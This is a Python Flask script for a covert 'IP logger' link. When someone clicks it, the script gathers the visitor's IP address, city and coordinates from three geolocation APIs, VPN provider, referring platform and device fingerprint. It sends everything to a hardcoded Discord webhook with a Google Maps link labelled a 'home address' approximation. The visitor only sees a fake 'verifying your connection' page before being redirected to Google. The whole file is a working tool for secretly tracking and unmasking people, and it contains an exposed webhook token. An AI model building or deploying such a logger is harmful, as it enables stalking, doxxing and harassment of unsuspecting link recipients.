# -*- coding: utf-8 -*-
"""
ULTIMATE GEOLOCATION + VPN + PLATFORM + MAP LINK LOGGER
- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io) for best accuracy
- Detects VPN/Proxy + extracts provider name (NordVPN, Mullvad, Proton, etc.)
- Detects which platform they clicked from (Discord, WhatsApp, TikTok, etc.)
- Includes a Google Maps link to their approximate location
- Full device fingerprint: OS, browser, device type, language, timezone
- Silent redirect to Google after 1.5 seconds
- Sends rich Discord embed with ALL data
"""

from flask import Flask, request, render_template_string
import requests
from datetime import datetime
from urllib.parse import urlparse

# ===================================================================
# CONFIGURATION – HARDCODED WEBHOOK (USER REQUESTED)
# ===================================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533345078586638426/Jf4GYOQI4zAdPxAUUs6lMOCrHPmVK2I48iOUsuaNpsaSHZnb-1wcQnPPJT-pXExJ-H6f"

# Add your own IP here to avoid logging yourself during tests
IGNORE_IPS = [
    "127.0.0.1",
    "YOUR_PUBLIC_IP_HERE",  # <-- Replace with your actual IP (whatismyip.com)
]

# -------------------------------------------------------------------
# Flask app instantiation (MUST be top-level)
# -------------------------------------------------------------------
app = Flask(__name__)

# ===================================================================
# PLATFORM / REFERRER DETECTION
# ===================================================================

PLATFORM_MAP = {
    'discord.com': 'Discord',
    'discordapp.com': 'Discord',
    'discord.gg': 'Discord Invite',
    'whatsapp.com': 'WhatsApp',
    'wa.me': 'WhatsApp',
    'web.whatsapp.com': 'WhatsApp (Web)',
    'facebook.com': 'Facebook',
    'fb.com': 'Facebook',
    'fb.watch': 'Facebook Watch',
    'instagram.com': 'Instagram',
    'tiktok.com': 'TikTok',
    'snapchat.com': 'Snapchat',
    'twitter.com': 'Twitter / X',
    'x.com': 'Twitter / X',
    't.co': 'Twitter / X (t.co)',
    'reddit.com': 'Reddit',
    'telegram.org': 'Telegram',
    't.me': 'Telegram',
    'youtube.com': 'YouTube',
    'youtu.be': 'YouTube',
    'meet.google.com': 'Google Meet',
    'linkedin.com': 'LinkedIn',
    'lnkd.in': 'LinkedIn (lnkd.in)',
    'messenger.com': 'Facebook Messenger',
    'mail.google.com': 'Gmail (Email)',
    'outlook.com': 'Outlook (Email)',
    'yahoo.com': 'Yahoo (Email)',
    'github.com': 'GitHub',
    'twitch.tv': 'Twitch',
    'roblox.com': 'Roblox',
}

def detect_platform(referer):
    if not referer:
        return '📌 Direct Link / Unknown'
    referer_lower = referer.lower()
    if 'l.facebook.com' in referer_lower or 'lm.facebook.com' in referer_lower:
        return 'Facebook (Link Redirect)'
    if 'l.instagram.com' in referer_lower:
        return 'Instagram (Link Redirect)'
    for domain, platform in PLATFORM_MAP.items():
        if domain in referer_lower:
            return platform
    try:
        parsed = urlparse(referer)
        domain = parsed.netloc or parsed.path
        if domain:
            return f"🔗 Unknown Site ({domain})"
    except:
        pass
    return f"🔗 Other: {referer[:50]}..."

# ===================================================================
# HELPER FUNCTIONS
# ===================================================================

def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def should_ignore(ip):
    return ip in IGNORE_IPS

def parse_user_agent(ua):
    os_name = "Unknown OS"
    browser = "Unknown Browser"
    device = "Desktop"

    if "Windows NT 10.0" in ua:
        os_name = "Windows 10/11"
    elif "Windows NT 6.1" in ua:
        os_name = "Windows 7"
    elif "Windows NT 6.3" in ua:
        os_name = "Windows 8.1"
    elif "Mac OS X" in ua:
        if "Mac OS X 10_15" in ua:
            os_name = "macOS Catalina"
        elif "Mac OS X 11_0" in ua:
            os_name = "macOS Big Sur"
        elif "Mac OS X 12_0" in ua:
            os_name = "macOS Monterey"
        else:
            os_name = "macOS"
    elif "Android" in ua:
        os_name = "Android"
        device = "Mobile"
    elif "iPhone" in ua:
        os_name = "iOS"
        device = "Mobile"
    elif "iPad" in ua:
        os_name = "iPadOS"
        device = "Tablet"
    elif "Linux" in ua:
        os_name = "Linux"

    if "Edg/" in ua:
        browser = "Microsoft Edge"
    elif "OPR/" in ua or "Opera" in ua:
        browser = "Opera"
    elif "Chrome/" in ua and "Edg/" not in ua and "OPR/" not in ua:
        browser = "Google Chrome"
    elif "Firefox/" in ua:
        browser = "Mozilla Firefox"
    elif "Safari/" in ua and "Chrome/" not in ua:
        browser = "Apple Safari"
    elif "Trident/" in ua or "MSIE" in ua:
        browser = "Internet Explorer"

    if "Tablet" in ua or "iPad" in ua:
        device = "Tablet"
    elif "Mobile" in ua and device != "Tablet":
        device = "Mobile"

    return os_name, browser, device

# -------------------------------------------------------------------
# GEOLOCATION & VPN DETECTION (Multi-API)
# -------------------------------------------------------------------

def get_geo_ipapi_co(ip):
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if 'error' in data:
            return None
        return {
            'country': data.get('country_name'),
            'region': data.get('region'),
            'city': data.get('city'),
            'lat': data.get('latitude'),
            'lon': data.get('longitude'),
            'isp': data.get('org'),
            'proxy': data.get('proxy') or data.get('vpn') or False,
            'timezone': data.get('timezone'),
        }
    except:
        return None

def get_geo_ip_api(ip):
    try:
        r = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy,timezone',
            timeout=5
        )
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get('status') != 'success':
            return None
        return {
            'country': data.get('country'),
            'region': data.get('regionName'),
            'city': data.get('city'),
            'lat': data.get('lat'),
            'lon': data.get('lon'),
            'isp': data.get('isp'),
            'proxy': data.get('proxy') or False,
            'timezone': data.get('timezone'),
        }
    except:
        return None

def get_geo_ipinfo(ip):
    try:
        r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if 'bogon' in data:
            return None
        org = data.get('org', '')
        isp = org.split(' ', 1)[-1] if org else None
        loc = data.get('loc', '').split(',')
        lat = loc[0] if len(loc) > 0 else None
        lon = loc[1] if len(loc) > 1 else None
        return {
            'country': data.get('country'),
            'region': data.get('region'),
            'city': data.get('city'),
            'lat': lat,
            'lon': lon,
            'isp': isp,
            'proxy': False,
            'timezone': data.get('timezone'),
        }
    except:
        return None

# -------------------------------------------------------------------
# VPN PROVIDER DETECTION
# -------------------------------------------------------------------

VPN_PROVIDERS = [
    'NordVPN', 'Mullvad', 'ProtonVPN', 'ExpressVPN', 'Surfshark',
    'CyberGhost', 'Private Internet Access', 'PIA', 'VyprVPN',
    'Windscribe', 'TunnelBear', 'Hotspot Shield', 'HideMyAss',
    'HMA', 'IPVanish', 'StrongVPN', 'Perfect Privacy', 'ZenVPN',
    'Cloudflare WARP', 'OVPN', 'PrivadoVPN', 'Atlas VPN',
    'FastestVPN', 'PureVPN', 'Ivacy', 'NordLayer', 'Perimeter 81',
    'Tailscale', 'ZeroTier', 'WireGuard', 'OpenVPN'
]

def extract_vpn_provider(isp_name):
    if not isp_name:
        return None
    isp_lower = isp_name.lower()
    for provider in VPN_PROVIDERS:
        if provider.lower() in isp_lower:
            return provider
    if 'nord' in isp_lower:
        return 'NordVPN'
    if 'mullvad' in isp_lower:
        return 'Mullvad'
    if 'proton' in isp_lower:
        return 'ProtonVPN'
    if 'expressvpn' in isp_lower:
        return 'ExpressVPN'
    if 'surfshark' in isp_lower:
        return 'Surfshark'
    return None

# -------------------------------------------------------------------
# AGGREGATED GEOLOCATION
# -------------------------------------------------------------------

def get_geo_info(ip):
    best = {}
    result = get_geo_ipapi_co(ip)
    if result:
        best = result
    result2 = get_geo_ip_api(ip)
    if result2:
        for key in ['country', 'region', 'city', 'lat', 'lon', 'isp', 'timezone']:
            if not best.get(key) and result2.get(key):
                best[key] = result2[key]
        if result2.get('proxy') is True:
            best['proxy'] = True
        elif result2.get('proxy') is False and not best.get('proxy'):
            best['proxy'] = False
    if not best.get('isp') or not best.get('country'):
        result3 = get_geo_ipinfo(ip)
        if result3:
            for key in ['country', 'region', 'city', 'lat', 'lon', 'isp', 'timezone']:
                if not best.get(key) and result3.get(key):
                    best[key] = result3[key]
    return best if best else None

# ===================================================================
# DISCORD NOTIFICATION
# ===================================================================

def send_discord_embed(ip, geo, ua, language, platform):
    if not DISCORD_WEBHOOK_URL:
        return

    vpn_status = "🟢 No VPN/Proxy"
    color = 0x00ff00
    vpn_provider = None

    if geo:
        if geo.get('proxy') is True:
            vpn_status = "🔴 VPN/Proxy Detected"
            color = 0xff0000
        isp = geo.get('isp', '')
        vpn_provider = extract_vpn_provider(isp)
        if vpn_provider and vpn_status == "🔴 VPN/Proxy Detected":
            vpn_status += f" → **{vpn_provider}**"

    location_str = f"{geo.get('city','N/A')}, {geo.get('region','N/A')}, {geo.get('country','N/A')}" if geo else "N/A"
    coords_str = f"{geo.get('lat','N/A')}, {geo.get('lon','N/A')}" if geo else "N/A"
    
    # GENERATE GOOGLE MAPS LINK (This is the "home address" approximation!)
    maps_link = f"https://www.google.com/maps?q={coords_str}" if coords_str != "N/A" else "N/A"
    
    isp_str = geo.get('isp', 'N/A') if geo else "N/A"
    tz_str = geo.get('timezone', 'N/A') if geo else "N/A"

    os_name, browser, device = parse_user_agent(ua)

    fields = [
        {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
        {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
        {"name": "📍 Location (City/Region)", "value": location_str, "inline": False},
        {"name": "🗺️ Approximate Coordinates", "value": f"`{coords_str}`", "inline": True},
        {"name": "📍 View on Map", "value": f"[Click here to see on Google Maps]({maps_link})", "inline": True},  # <-- NEW!
        {"name": "📡 ISP / Org", "value": isp_str, "inline": True},
        {"name": "🕒 Timezone", "value": tz_str, "inline": True},
        {"name": "📱 Clicked From", "value": platform, "inline": False},
        {"name": "💻 Device", "value": device, "inline": True},
        {"name": "🖥️ OS", "value": os_name, "inline": True},
        {"name": "🌐 Browser", "value": browser, "inline": True},
        {"name": "🌎 Language", "value": language, "inline": True},
        {"name": "📅 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False},
    ]

    embed = {
        "title": "🎯 Visitor Logged (Map Link Included)",
        "color": color,
        "fields": fields,
        "footer": {"text": "Ultimate Logger · v4.0"},
        "timestamp": datetime.utcnow().isoformat()
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Discord send error: {e}")

# ===================================================================
# ROUTES
# ===================================================================

@app.route('/')
def index():
    ip = get_client_ip()
    if not should_ignore(ip):
        referer = request.headers.get('Referer', '')
        platform = detect_platform(referer)
        geo = get_geo_info(ip)
        ua = request.headers.get('User-Agent', 'Unknown')
        language = request.headers.get('Accept-Language', 'Unknown')
        send_discord_embed(ip, geo, ua, language, platform)

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="1.5;url=https://www.google.com">
        <title>Loading...</title>
        <style>
            body { background: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; color: white; }
            .spinner { border: 4px solid #2a2a4a; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div style="text-align:center;">
            <div class="spinner"></div>
            <h2>Loading secure page...</h2>
            <p style="color:#888;">Please wait while we verify your connection.</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/verify')
def verify():
    return index()

# ===================================================================
# LOCAL DEVELOPMENT ENTRY
# ===================================================================
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
